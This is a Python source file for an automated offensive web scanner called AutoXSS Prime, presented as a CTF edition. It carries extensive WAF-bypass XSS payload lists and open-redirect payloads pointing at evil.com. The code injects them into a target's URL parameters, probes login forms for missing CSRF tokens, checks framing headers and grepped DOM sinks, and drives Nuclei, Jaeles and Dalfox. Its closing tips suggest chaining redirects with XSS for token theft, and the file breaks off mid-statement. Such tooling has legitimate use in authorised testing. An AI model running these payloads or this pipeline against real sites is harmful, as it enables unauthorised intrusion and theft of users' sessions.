#!/usr/bin/env python3
"""
AutoXSS Prime v2.0 - Enhanced CTF Edition
Created by: Rahul A.K.A SecurityBong
Enhancements: DOM XSS, Login CSRF detection, Clickjacking check,
Open Redirect chaining, WAF bypass payloads, credentialless-iframe
prerequisites, reflected param detection.
"""

import subprocess
import os
import sys
import shutil
import time
import threading
import json
import re
import urllib.parse
import urllib.request
import http.client
import html

# ─── BRANDING ────────────────────────────────────────────────────────────────
TOOL_NAME  = "AutoXSS Prime"
VERSION    = "2.0 (CTF Enhanced)"
CREATOR    = "Rahul A.K.A SecurityBong"
DESC       = "Automated XSS / Open-Redirect / CSRF-chain scanner."

# ─── CONFIG ──────────────────────────────────────────────────────────────────
HOME          = os.path.expanduser("~")
WORKSPACE_DIR = os.path.abspath("AutoXSS_Workspace")
TOOLS_DIR     = os.path.join(WORKSPACE_DIR, "tools")
MAX_URLS_SCAN = 15000

JAELES_SIG_REPO = "https://github.com/jaeles-project/jaeles-signatures.git"
JAELES_SIG_PATH = os.path.join(TOOLS_DIR, "jaeles-signatures")

# ─── OPEN-REDIRECT PAYLOADS ──────────────────────────────────────────────────
# Techniques from the hint links: bare protocol, protocol-relative,
# double-slash bypass, url encoding, parameter smuggling
OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "//evil.com/",
    "///evil.com",
    "////evil.com",
    "/\\evil.com",
    "\\\\evil.com",
    "https:evil.com",
    "javascript:alert(1)",
    "%2F%2Fevil.com",
    "%5C%5Cevil.com",
    "http://evil.com",
    "https://evil.com%2F@target.com",         # credential confusion
    "https://target.com@evil.com",             # @ bypass
    "https://evil.com?target.com",             # query confusion
    "https://evil%E3%80%82com",                # Unicode dot
    "\x09//evil.com",                          # tab bypass
    "\x0d//evil.com",                          # CR bypass
    "\x0a//evil.com",                          # LF bypass
    "/%09/evil.com",
    "//%09evil.com",
]

# ─── XSS PAYLOADS – WAF-BYPASS FOCUSED ──────────────────────────────────────
# Techniques from the Invicti / Akamai bypass blog:
# template literals, event handler capitalisation, HTML entity encoding,
# svg/math namespace, CSS expression tricks, polyglots
WAF_BYPASS_XSS_PAYLOADS = [
    # Template-literal / ES6 trick (highlighted in Invicti article)
    "<svg onload=eval`alert\x60xss\x60`>",
    "<svg onload=`alert(1)`>",
    # HTML entity encoded handlers
    "<img src=x o&#110;error=alert(1)>",
    "<img src=x onerror&#61;alert(1)>",
    # Mixed case
    "<ScRiPt>alert(1)</sCrIpT>",
    "<IMG SRC=x OnErRoR=alert(1)>",
    # SVG / math namespace (often missed by WAFs)
    "<svg><script>alert(1)</script></svg>",
    "<math><mtext><table><mglyph><style><!--</style><img title='--></style><img src=1 onerror=alert(1)>'>",
    # srcdoc iframe (no direct URL, bypasses URL-based filters)
    "<iframe srcdoc='&#60;script&#62;alert(1)&#60;/script&#62;'>",
    # data URI (for contexts where href/src is reflected)
    "data:text/html,<script>alert(1)</script>",
    # Null byte / comment injection
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    "<!--<img src='--><img src=x onerror=alert(1)//'>",
    # fromCharCode obfuscation
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    # CSS expression (old IE, sometimes still scoped)
    "<div style=width:expression(alert(1))>",
    # Double-encoded
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
    # DOM clobbering friendly
    "<form id=x></form><script>document.getElementById('x').onsubmit=function(){alert(1)}</script>",
    # Angular/Vue template injection (for JS-framework apps)
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "#{alert(1)}",
    # CSP bypass via JSONP (detector only — checks if payload reflects)
    "');alert(1)//",
    "\";alert(1)//",
    "';alert(1)//",
    "</script><script>alert(1)</script>",
    # Attribute injection
    "\" onmouseover=alert(1) x=\"",
    "' onmouseover=alert(1) x='",
    # href sink
    "javascript:alert(1)//",
    # srcdoc + meta refresh
    "<iframe srcdoc=\"<meta http-equiv=refresh content='0;url=javascript:alert(1)'>\">",
]

# ─── DOM SINK PATTERNS ───────────────────────────────────────────────────────
# Patterns to grep from downloaded JS files
DOM_SINKS = [
    r"document\.write\s*\(",
    r"\.innerHTML\s*=",
    r"\.outerHTML\s*=",
    r"eval\s*\(",
    r"setTimeout\s*\(",
    r"setInterval\s*\(",
    r"location\s*=\s*[^=]",
    r"location\.href\s*=",
    r"location\.replace\s*\(",
    r"location\.assign\s*\(",
    r"location\.hash",
    r"document\.cookie\s*=",
    r"\.src\s*=",
    r"\.action\s*=",
    r"window\.open\s*\(",
    r"insertAdjacentHTML",
    r"createContextualFragment",
    r"\$\s*\(\s*['\"]",      # jQuery selector from variable
    r"\.html\s*\(",          # jQuery .html()
]

# ─── DOM SOURCE PATTERNS ─────────────────────────────────────────────────────
DOM_SOURCES = [
    r"location\.hash",
    r"location\.search",
    r"location\.href",
    r"document\.URL",
    r"document\.referrer",
    r"window\.name",
    r"location\.pathname",
]

# ─── UTILS ───────────────────────────────────────────────────────────────────

def print_banner():
    print("\033[96m" + "="*70)
    print(f"  {TOOL_NAME} | {VERSION}")
    print(f"  Created by: {CREATOR}")
    print(f"  {DESC}")
    print("="*70 + "\033[0m")
    sys.stdout.flush()


def log(msg, level="INFO"):
    colors = {
        "INFO":    "\033[94m[i]\033[0m",
        "SUCCESS": "\033[92m[+]\033[0m",
        "WARN":    "\033[93m[!]\033[0m",
        "ERROR":   "\033[91m[-]\033[0m",
        "SETUP":   "\033[95m[SETUP]\033[0m",
        "VULN":    "\033[91m[VULN]\033[0m",
        "BONUS":   "\033[96m[BONUS]\033[0m",
        "DOM":     "\033[93m[DOM]\033[0m",
        "CSRF":    "\033[95m[CSRF]\033[0m",
        "REDIR":   "\033[96m[REDIR]\033[0m",
        "CLICK":   "\033[93m[CLICK]\033[0m",
    }
    print(f"{colors.get(level, '[?]')} {msg}")
    sys.stdout.flush()


def resolve_binary_path(tool_name):
    if shutil.which(tool_name):
        return shutil.which(tool_name)
    for p in [
        os.path.join(HOME, "go", "bin", tool_name),
        os.path.join("/usr/local/go/bin", tool_name),
        os.path.join("/usr/bin", tool_name),
        os.path.join(TOOLS_DIR, tool_name),
    ]:
        if os.path.exists(p):
            return p
    return None


def run_cmd_spinner(cmd, task_name, timeout=3600):
    stop = threading.Event()
    def _spin():
        chars = "|/-\\"
        i = 0
        t0 = time.time()
        while not stop.is_set():
            sys.stdout.write(f"\r\033[93m[Wait]\033[0m {task_name}... {chars[i]} ({int(time.time()-t0)}s)")
            sys.stdout.flush()
            time.sleep(0.1)
            i = (i + 1) % 4
    t = threading.Thread(target=_spin)
    t.start()
    ok = False
    try:
        subprocess.run(cmd, shell=True, check=True, timeout=timeout,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        ok = True
    except Exception:
        pass
    stop.set()
    t.join()
    sys.stdout.write("\r" + " "*100 + "\r")
    return ok


def clean_target_workspace(target_dir):
    if os.path.exists(target_dir):
        try:
            shutil.rmtree(target_dir)
            time.sleep(0.3)
        except Exception:
            pass
    os.makedirs(target_dir, exist_ok=True)


def http_get(url, timeout=10):
    """Simple HTTP GET; returns (status, headers_dict, body_str) or None."""
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "AutoXSS-Prime/2.0"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read(1_000_000).decode("utf-8", errors="ignore")
            return r.status, dict(r.headers), body
    except Exception:
        return None


# ─── SETUP ───────────────────────────────────────────────────────────────────

def setup():
    print("\n\033[1m--- [ PRE-FLIGHT CHECK ] ---\033[0m")
    for d in [WORKSPACE_DIR, TOOLS_DIR]:
        os.makedirs(d, exist_ok=True)

    go_tools = {
        "gau":    "github.com/lc/gau/v2/cmd/gau@latest",
        "katana": "github.com/projectdiscovery/katana/cmd/katana@latest",
        "dalfox": "github.com/hahwul/dalfox/v2@latest",
        "nuclei": "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
        "httpx":  "github.com/projectdiscovery/httpx/cmd/httpx@latest",
        "jaeles": "github.com/jaeles-project/jaeles@latest",
    }
    go_ok = shutil.which("go") is not None
    for name, path in go_tools.items():
        if resolve_binary_path(name):
            log(f"Tool '{name}' found.", "SUCCESS")
        else:
            if not go_ok:
                log(f"Cannot install '{name}': Go not found. Run: sudo apt install golang", "ERROR")
                sys.exit(1)
            log(f"Installing '{name}'...", "SETUP")
            run_cmd_spinner(f"go install {path}", f"Installing {name}")
            if not resolve_binary_path(name):
                log(f"Failed to install '{name}'. Install manually: go install {path}", "ERROR")
                sys.exit(1)

    if not os.path.exists(JAELES_SIG_PATH):
        subprocess.run(f"git clone {JAELES_SIG_REPO} {JAELES_SIG_PATH}",
                       shell=True, stderr=subprocess.DEVNULL)

    nuclei_bin = resolve_binary_path("nuclei")
    if nuclei_bin:
        log("Updating Nuclei templates...", "SETUP")
        subprocess.run(f"{nuclei_bin} -update-templates", shell=True, stderr=subprocess.DEVNULL)

    print("\033[1m--- [ READY ] ---\033[0m\n")


# ─── LIVE CHECK ──────────────────────────────────────────────────────────────

def check_alive(urls, target_dir):
    log(f"Checking {len(urls)} URLs with httpx...", "INFO")
    httpx_bin = resolve_binary_path("httpx")
    if not httpx_bin:
        log("httpx not found — returning raw URLs.", "WARN")
        return urls
    tmp_in  = os.path.join(target_dir, "_httpx_in.txt")
    tmp_out = os.path.join(target_dir, "_httpx_out.txt")
    with open(tmp_in, "w") as f:
        f.write("\n".join(urls))
    run_cmd_spinner(f"{httpx_bin} -l {tmp_in} -fc 404 -silent -t 50 -o {tmp_out}",
                    "HTTPX (validating live endpoints)")
    alive = []
    if os.path.exists(tmp_out):
        with open(tmp_out) as f:
            alive = [l.strip() for l in f if l.strip()]
        os.remove(tmp_out)
    for p in [tmp_in]:
        if os.path.exists(p):
            os.remove(p)
    return alive


# ─── NEW MODULE 1: CLICKJACKING / FRAME DETECTION ────────────────────────────
# Relevant: slonser credentialless iframe technique & HackerOne report #892289
# If X-Frame-Options is missing → app is frameable → XSS chains possible

def check_clickjacking(url, target_dir, vuln_list):
    log(f"Checking clickjacking protection on {url}", "INFO")
    result = http_get(url)
    if not result:
        log("Could not reach target for clickjacking check.", "WARN")
        return
    status, headers, body = result
    xfo = headers.get("x-frame-options", "").upper()
    csp = headers.get("content-security-policy", "")
    fa_in_csp = "frame-ancestors" in csp.lower()

    if not xfo and not fa_in_csp:
        log(f"CLICKJACKING VULNERABLE: No X-Frame-Options / frame-ancestors CSP on {url}", "CLICK")
        log("  → Frameable! Enables: login CSRF + self-XSS chain, XSSJacking", "CLICK")
        vuln_list.append({
            "type": "clickjacking",
            "url": url,
            "detail": "Missing X-Frame-Options and frame-ancestors CSP"
        })
    elif xfo in ("SAMEORIGIN", "DENY"):
        log(f"X-Frame-Options: {xfo} (protected)", "SUCCESS")
    elif fa_in_csp:
        log(f"frame-ancestors found in CSP (protected)", "SUCCESS")
    else:
        log(f"X-Frame-Options: {xfo} — partial protection", "WARN")

    # Also check for fetchLater / COEP headers (relevant to credentialless iframe attack surface)
    coep = headers.get("cross-origin-embedder-policy", "")
    if coep:
        log(f"COEP: {coep}", "INFO")


# ─── NEW MODULE 2: LOGIN CSRF DETECTION ──────────────────────────────────────
# Relevant: slonser's login CSRF → self-XSS upgrade technique
# Checks login/register forms for missing CSRF tokens

def check_login_csrf(base_url, target_dir, vuln_list):
    log("Checking login/register endpoints for CSRF...", "INFO")
    login_paths = [
        "/login", "/signin", "/sign-in", "/log-in", "/account/login",
        "/user/login", "/auth/login", "/register", "/signup", "/sign-up",
        "/account/register", "/user/register",
    ]
    parsed = urllib.parse.urlparse(base_url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    found = []
    for path in login_paths:
        url = base + path
        r = http_get(url)
        if not r:
            continue
        status, headers, body = r
        if status not in (200, 405):
            continue
        body_l = body.lower()
        # Look for a <form> with method=post
        if "<form" not in body_l:
            continue
        # Check for CSRF token indicators
        has_csrf = any(x in body_l for x in [
            "csrf", "_token", "authenticity_token", "xsrf",
            "__requestverificationtoken", "state="
        ])
        if not has_csrf:
            log(f"LOGIN CSRF MISSING on {url} — no CSRF token in form", "CSRF")
            log("  → Chain: Login CSRF + self-XSS → full XSS (slonser technique)", "CSRF")
            found.append({"type": "login_csrf", "url": url})
            vuln_list.append({"type": "login_csrf", "url": url,
                               "detail": "Login form missing CSRF protection"})
        else:
            log(f"CSRF token present on {url}", "SUCCESS")
    if not found:
        log("No unprotected login/register forms found (or not accessible).", "INFO")


# ─── NEW MODULE 3: OPEN REDIRECT (ENHANCED) ──────────────────────────────────
# Standard scanners miss many redirect variants. This tests all param values
# with a comprehensive payload list and follows the response.

def check_open_redirects(urls, target_dir, vuln_list):
    log(f"Testing open redirects on {min(len(urls), 300)} URLs...", "INFO")
    redir_params = re.compile(
        r"(url|redirect|redir|return|returnurl|return_url|next|goto|target|"
        r"dest|destination|forward|link|out|exit|go|ref|referer|"
        r"callback|continue|r|u|l|path|navigate|nav)=",
        re.IGNORECASE
    )
    count = 0
    tested = set()
    for url in urls[:300]:
        if not redir_params.search(url):
            continue
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        for param in qs:
            if not redir_params.search(param + "=x"):
                continue
            for payload in OPEN_REDIRECT_PAYLOADS[:8]:   # top 8 for speed
                new_qs = dict(qs)
                new_qs[param] = [payload]
                new_url = urllib.parse.urlunparse(
                    parsed._replace(query=urllib.parse.urlencode(new_qs, doseq=True))
                )
                if new_url in tested:
                    continue
                tested.add(new_url)
                try:
                    req = urllib.request.Request(
                        new_url,
                        headers={"User-Agent": "AutoXSS-Prime/2.0"},
                    )
                    # We don't follow redirects automatically — check Location header
                    import urllib.error
                    try:
                        with urllib.request.urlopen(req, timeout=6) as resp:
                            loc = resp.headers.get("Location", "")
                    except urllib.error.HTTPError as e:
                        loc = e.headers.get("Location", "")
                    except Exception:
                        loc = ""
                    if loc and ("evil.com" in loc or loc.startswith("//") or
                                loc.startswith("javascript:")):
                        log(f"OPEN REDIRECT: {new_url}", "REDIR")
                        log(f"  → Redirects to: {loc}", "REDIR")
                        vuln_list.append({"type": "open_redirect", "url": new_url,
                                          "location": loc, "payload": payload})
                        count += 1
                except Exception:
                    pass
    log(f"Open redirect check done. Found: {count}", "SUCCESS" if count else "INFO")


# ─── NEW MODULE 4: REFLECTED PARAM DETECTION ─────────────────────────────────
# Injects a unique canary into each param; checks if it's reflected unencoded.
# Uses WAF-bypass payloads if plain canary is reflected.

CANARY = "xsscanary13337"

def check_reflected_params(urls, target_dir, vuln_list):
    log(f"Checking reflected params on up to 200 URLs...", "INFO")
    reflected_report = os.path.join(target_dir, "reflected_params.txt")
    count = 0
    tested_params = set()

    for url in urls[:200]:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue

        for param in qs:
            key = f"{parsed.netloc}{parsed.path}|{param}"
            if key in tested_params:
                continue
            tested_params.add(key)

            # Step 1: Canary reflection check
            new_qs = dict(qs)
            new_qs[param] = [CANARY]
            test_url = urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(new_qs, doseq=True))
            )
            r = http_get(test_url)
            if not r:
                continue
            _, _, body = r

            if CANARY not in body:
                continue

            # Canary reflected → check encoding context
            # Find what surrounds the canary in HTML
            idx = body.find(CANARY)
            snippet = body[max(0, idx-60):idx+len(CANARY)+60]
            in_attr  = re.search(r'=\s*["\'][^"\']*' + CANARY, snippet) is not None
            in_js    = re.search(r'(var|let|const|=)\s*["\'][^"\']*' + CANARY, snippet) is not None
            in_tag   = CANARY in snippet and "<" not in snippet[:snippet.find(CANARY)]

            context = "attribute" if in_attr else ("js_string" if in_js else "html")
            log(f"REFLECTED [{context}]: {parsed.netloc}{parsed.path} param={param}", "VULN")
            log(f"  Snippet: {snippet.strip()[:100]}", "INFO")

            # Step 2: Try WAF-bypass payloads in this param
            confirmed = False
            for payload in WAF_BYPASS_XSS_PAYLOADS[:10]:
                new_qs[param] = [payload]
                xss_url = urllib.parse.urlunparse(
                    parsed._replace(query=urllib.parse.urlencode(new_qs, doseq=True))
                )
                r2 = http_get(xss_url)
                if not r2:
                    continue
                _, _, body2 = r2
                # Check if payload appears unencoded
                decoded_payload = html.unescape(payload)
                if payload in body2 or decoded_payload in body2:
                    if "alert" in body2 or "onerror" in body2 or "onload" in body2:
                        log(f"XSS PAYLOAD REFLECTED (unfiltered): {xss_url}", "VULN")
                        log(f"  Payload: {payload[:80]}", "VULN")
                        vuln_list.append({
                            "type": "reflected_xss",
                            "url": xss_url,
                            "param": param,
                            "payload": payload,
                            "context": context,
                        })
                        confirmed = True
                        count += 1
                        break

            if not confirmed:
                # Still note the reflected param even if payload was filtered
                vuln_list.append({
                    "type": "reflected_param",
                    "url": test_url,
                    "param": param,
                    "context": context,
                    "note": "Canary reflected but payloads filtered — try manual WAF bypass",
                })
                with open(reflected_report, "a") as f:
                    f.write(f"{test_url}\t{param}\t{context}\n")

    log(f"Reflected param check done. XSS confirmed: {count}", "SUCCESS" if count else "INFO")


# ─── NEW MODULE 5: DOM XSS STATIC ANALYSIS ───────────────────────────────────
# Downloads JS files from live pages and searches for dangerous sink+source combos.

def check_dom_xss(urls, target_dir, vuln_list):
    log("Scanning JS files for DOM XSS sinks/sources...", "INFO")
    js_urls = set()
    # Collect JS URLs from page sources
    for url in urls[:100]:
        r = http_get(url)
        if not r:
            continue
        _, _, body = r
        # Find script src
        for m in re.finditer(r'<script[^>]+src=["\']([^"\']+)["\']', body, re.IGNORECASE):
            src = m.group(1)
            if src.startswith("//"):
                src = "https:" + src
            elif src.startswith("/"):
                p = urllib.parse.urlparse(url)
                src = f"{p.scheme}://{p.netloc}{src}"
            elif not src.startswith("http"):
                src = url.rstrip("/") + "/" + src
            js_urls.add(src)
        # Also look for inline script blocks
        for m in re.finditer(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.IGNORECASE):
            inline = m.group(1)
            _analyse_js_block(inline, url, "inline", vuln_list)

    sink_re   = [re.compile(p, re.IGNORECASE) for p in DOM_SINKS]
    source_re = [re.compile(p, re.IGNORECASE) for p in DOM_SOURCES]
    dom_report = os.path.join(target_dir, "dom_sinks.txt")
    count = 0

    for js_url in list(js_urls)[:150]:
        r = http_get(js_url)
        if not r:
            continue
        _, _, js_body = r
        _analyse_js_block(js_body, js_url, "external", vuln_list)
        sinks_found   = [p for p, rx in zip(DOM_SINKS, sink_re)   if rx.search(js_body)]
        sources_found = [p for p, rx in zip(DOM_SOURCES, source_re) if rx.search(js_body)]
        if sinks_found and sources_found:
            log(f"DOM XSS CANDIDATE: {js_url}", "DOM")
            log(f"  Sources: {sources_found[:3]}", "DOM")
            log(f"  Sinks:   {sinks_found[:3]}", "DOM")
            vuln_list.append({
                "type": "dom_xss_candidate",
                "url": js_url,
                "sources": sources_found[:5],
                "sinks": sinks_found[:5],
            })
            with open(dom_report, "a") as f:
                f.write(f"{js_url}\n  sources: {sources_found}\n  sinks: {sinks_found}\n\n")
            count += 1

    log(f"DOM XSS static analysis done. Candidates: {count}", "SUCCESS" if count else "INFO")


def _analyse_js_block(code, origin, kind, vuln_list):
    """Check for taint flows: source used near a sink in same code block."""
    source_re = [re.compile(p, re.IGNORECASE) for p in DOM_SOURCES]
    sink_re   = [re.compile(p, re.IGNORECASE) for p in DOM_SINKS]
    src_hits  = [p for p, rx in zip(DOM_SOURCES, source_re) if rx.search(code)]
    snk_hits  = [p for p, rx in zip(DOM_SINKS,   sink_re)   if rx.search(code)]
    if src_hits and snk_hits:
        log(f"DOM TAINT ({kind}): {origin[:80]}", "DOM")


# ─── NEW MODULE 6: CSP ANALYSIS ──────────────────────────────────────────────
# Weak CSPs are what make XSS exploitation actually work in CTFs

def check_csp(url, vuln_list):
    r = http_get(url)
    if not r:
        return
    _, headers, _ = r
    csp = headers.get("content-security-policy", "")
    if not csp:
        log(f"No CSP header on {url} → XSS payloads will execute freely", "VULN")
        vuln_list.append({"type": "no_csp", "url": url})
        return
    issues = []
    if "'unsafe-inline'" in csp:
        issues.append("unsafe-inline (inline scripts allowed)")
    if "'unsafe-eval'" in csp:
        issues.append("unsafe-eval (eval() allowed)")
    if "* " in csp or csp.strip().endswith("*"):
        issues.append("wildcard source (*)")
    if "data:" in csp:
        issues.append("data: URI source")
    if issues:
        log(f"WEAK CSP on {url}: {', '.join(issues)}", "WARN")
        vuln_list.append({"type": "weak_csp", "url": url, "issues": issues, "csp": csp})
    else:
        log(f"CSP looks strict on {url}", "SUCCESS")


# ─── NUCLEI PARSER ───────────────────────────────────────────────────────────

def parse_nuclei_results(filepath, vuln_list):
    count = 0
    if not os.path.exists(filepath):
        return count
    with open(filepath, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                data      = json.loads(line)
                name      = data.get("info", {}).get("name", "Unknown")
                severity  = data.get("info", {}).get("severity", "info").upper()
                matched   = data.get("matched-at", "Unknown URL")
                extracted = data.get("extracted-results", [])
                mname     = data.get("matcher-name", "")
                details   = f" | {', '.join(extracted)}" if extracted else (f" | {mname}" if mname else "")
                if "xss" in name.lower() or "cross-site" in name.lower():
                    print(f"\n\033[91m[VULN] Nuclei XSS ({severity}): {name}\033[0m")
                    print(f"  URL: {matched}{details}")
                    vuln_list.append({"type": "nuclei_xss", "url": matched, "name": name})
                else:
                    col = "\033[96m"
                    if severity == "CRITICAL": col = "\033[91m"
                    elif severity == "HIGH":   col = "\033[93m"
                    print(f"\n{col}[BONUS] Nuclei ({severity}): {name}\033[0m")
                    print(f"  URL: {matched}{details}")
                count += 1
            except Exception:
                print(f"\n\033[96m[BONUS] Nuclei raw: {line}\033[0m")
                count += 1
    return count


# ─── MAIN PIPELINE ───────────────────────────────────────────────────────────

def run_pipeline(target_input):
    target_input = target_input.strip()
    if target_input.startswith("http"):
        domain_full  = target_input
        domain_clean = target_input.split("//")[1].split("/")[0]
    else:
        domain_full  = f"https://{target_input}"
        domain_clean = target_input.split("/")[0]

    target_dir = os.path.join(WORKSPACE_DIR, domain_clean)
    clean_target_workspace(target_dir)
    vuln_list = []

    log(f"Target: {domain_full}", "INFO")
    log(f"Workspace: {target_dir}", "INFO")

    raw_path  = os.path.join(target_dir, "raw_urls.txt")
    live_path = os.path.join(target_dir, "live_targets.txt")

    gau_bin    = resolve_binary_path("gau")    or "gau"
    katana_bin = resolve_binary_path("katana") or "katana"

    # ── RECON ────────────────────────────────────────────────────────────────
    run_cmd_spinner(f"{gau_bin} {domain_clean} --threads 10 >> {raw_path} 2>&1",
                    "GAU (historical URLs)")
    run_cmd_spinner(f"{katana_bin} -u {domain_full} -d 3 -jc -ps -silent >> {raw_path}",
                    "Katana (crawling)")

    # ── FILTER PARAMETERISED ─────────────────────────────────────────────────
    found_urls = []
    all_urls   = []   # all URLs including param-less (needed for JS analysis)
    if os.path.exists(raw_path):
        with open(raw_path, encoding="utf-8", errors="ignore") as f:
            for line in f:
                u = line.strip()
                if u:
                    all_urls.append(u)
                    if "?" in u:
                        found_urls.append(u)
    unique_urls = list(set(found_urls))
    log(f"Found {len(unique_urls)} parameterised URLs.", "INFO")

    # ── LIVE CHECK ───────────────────────────────────────────────────────────
    alive_urls = []
    if unique_urls:
        alive_urls = check_alive(unique_urls, target_dir)[:MAX_URLS_SCAN]
        with open(live_path, "w") as f:
            f.write("\n".join(alive_urls))
        log(f"Live parameterised URLs: {len(alive_urls)}", "SUCCESS")
    else:
        log("No parameterised URLs found. Running header/DOM checks only.", "WARN")

    # ═══════════════════════════════════════════════════════════════════════
    # NEW PHASE A: HEADER / SECURITY-CONFIG CHECKS
    # ═══════════════════════════════════════════════════════════════════════
    print("\n\033[1m--- [ PHASE A: Security Header Checks ] ---\033[0m")
    check_clickjacking(domain_full, target_dir, vuln_list)
    check_csp(domain_full, vuln_list)

    # ═══════════════════════════════════════════════════════════════════════
    # NEW PHASE B: LOGIN CSRF CHECK
    # ═══════════════════════════════════════════════════════════════════════
    print("\n\033[1m--- [ PHASE B: Login CSRF Check ] ---\033[0m")
    check_login_csrf(domain_full, target_dir, vuln_list)

    # ═══════════════════════════════════════════════════════════════════════
    # NEW PHASE C: REFLECTED PARAM + WAF-BYPASS XSS
    # ═══════════════════════════════════════════════════════════════════════
    print("\n\033[1m--- [ PHASE C: Reflected Params + WAF-bypass XSS ] ---\033[0m")
    if alive_urls:
        check_reflected_params(alive_urls, target_dir, vuln_list)

    # ═══════════════════════════════════════════════════════════════════════
    # NEW PHASE D: OPEN REDIRECT (ENHANCED)
    # ═══════════════════════════════════════════════════════════════════════
    print("\n\033[1m--- [ PHASE D: Open Redirect (Enhanced) ] ---\033[0m")
    if alive_urls:
        check_open_redirects(alive_urls, target_dir, vuln_list)

    # ═══════════════════════════════════════════════════════════════════════
    # NEW PHASE E: DOM XSS STATIC ANALYSIS
    # ═══════════════════════════════════════════════════════════════════════
    print("\n\033[1m--- [ PHASE E: DOM XSS Static Analysis ] ---\033[0m")
    check_dom_xss(alive_urls or all_urls[:100], target_dir, vuln_list)

    # ═══════════════════════════════════════════════════════════════════════
    # ORIGINAL PHASE 1-4: NUCLEI + JAELES + DALFOX
    # ═══════════════════════════════════════════════════════════════════════
    print("\n\033[1m--- [ PHASE 1: Nuclei Domain Scan ] ---\033[0m")
    nuclei_bin = resolve_binary_path("nuclei")
    if nuclei_bin:
        out_a = os.path.join(target_dir, "nuclei_general.json")
        run_cmd_spinner(f"{nuclei_bin} -u {domain_full} -j -o {out_a}",
                        "Nuclei (domain-level)")
        parse_nuclei_results(out_a, vuln_list)

        if alive_urls:
            print("\n\033[1m--- [ PHASE 2: Nuclei DAST ] ---\033[0m")
            out_b = os.path.join(target_dir, "nuclei_dast.json")
            run_cmd_spinner(
                f"{nuclei_bin} -l {live_path} -tags dast,xss,sqli,lfi,injection -j -o {out_b}",
                "Nuclei (parameter DAST)")
            parse_nuclei_results(out_b, vuln_list)

    if alive_urls:
        # JAELES
        print("\n\033[1m--- [ PHASE 3: Jaeles ] ---\033[0m")
        jaeles_bin = resolve_binary_path("jaeles")
        if jaeles_bin and os.path.exists(JAELES_SIG_PATH):
            jaeles_out = os.path.join(target_dir, "jaeles_out")
            run_cmd_spinner(
                f"{jaeles_bin} scan -c 50 -U {live_path} -s {JAELES_SIG_PATH} "
                f"--no-background -O {jaeles_out} --quiet",
                "Jaeles (signature scan)")
            if os.path.exists(jaeles_out):
                for root, _, files in os.walk(jaeles_out):
                    for fn in files:
                        if fn.endswith(".txt"):
                            with open(os.path.join(root, fn), errors="ignore") as f:
                                hl = f.readline().strip()
                            print(f"\n\033[96m[BONUS] Jaeles ({fn}):\033[0m\n  {hl}")

        # DALFOX
        print("\n\033[1m--- [ PHASE 4: Dalfox Mass XSS ] ---\033[0m")
        dalfox_bin = resolve_binary_path("dalfox")
        if dalfox_bin:
            # Inject WAF-bypass payloads via custom payload file
            custom_payloads_file = os.path.join(target_dir, "custom_payloads.txt")
            with open(custom_payloads_file, "w") as f:
                f.write("\n".join(WAF_BYPASS_XSS_PAYLOADS))
            dalfox_out = os.path.join(target_dir, "dalfox.txt")
            run_cmd_spinner(
                f"{dalfox_bin} file {live_path} --skip-mining-all --format plain "
                f"--custom-payload {custom_payloads_file} > {dalfox_out}",
                "Dalfox (XSS + WAF-bypass payloads)")
            if os.path.exists(dalfox_out):
                with open(dalfox_out, errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if "[POC]" in line:
                            parts = line.split("http", 1)
                            if len(parts) > 1:
                                furl = "http" + parts[1].strip()
                                if "[V]" in line or "inHTML" in line:
                                    print(f"\n\033[91m[VULN] Dalfox XSS Confirmed!\033[0m")
                                    print(f"  \033[93m{furl}\033[0m")
                                    vuln_list.append({"type": "dalfox_xss", "url": furl})
                                elif "[R]" in line:
                                    print(f"\n\033[93m[WARN] Dalfox Redirect:\033[0m")
                                    print(f"  \033[97m{furl}\033[0m")
                                    vuln_list.append({"type": "dalfox_redirect", "url": furl})

    # ─── FINAL REPORT ────────────────────────────────────────────────────────
    report_path = os.path.join(target_dir, "report.json")
    with open(report_path, "w") as f:
        json.dump(vuln_list, f, indent=2)

    print("\n" + "="*70)
    xss_count    = sum(1 for v in vuln_list if "xss" in v["type"])
    redir_count  = sum(1 for v in vuln_list if "redirect" in v["type"])
    csrf_count   = sum(1 for v in vuln_list if "csrf" in v["type"])
    click_count  = sum(1 for v in vuln_list if "clickjacking" in v["type"])
    dom_count    = sum(1 for v in vuln_list if "dom" in v["type"])
    other_count  = len(vuln_list) - xss_count - redir_count - csrf_count - click_count - dom_count

    log(f"Scan Complete! Total findings: {len(vuln_list)}", "SUCCESS")
    log(f"  XSS: {xss_count}  |  Open Redirect: {redir_count}  |  Login CSRF: {csrf_count}", "INFO")
    log(f"  Clickjacking: {click_count}  |  DOM XSS candidates: {dom_count}  |  Other: {other_count}", "INFO")
    log(f"Full JSON report: {report_path}", "INFO")
    log(f"Workspace: {target_dir}", "INFO")

    if click_count or csrf_count:
        log("TIP: Clickjacking + Login CSRF found → try credentialless iframe XSS chain (slonser technique)", "BONUS")
    if redir_count:
        log("TIP: Open redirects found → chain with XSS payload in 'next' param for token theft", "BONUS")
    if dom_count:
        log("TIP: DOM sinks found → test manually with location.hash / window.name payloads", "BONUS")


# ─── ENTRY POINT ─────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print_banner()
    setup()
    if len(sys.argv) > 1:
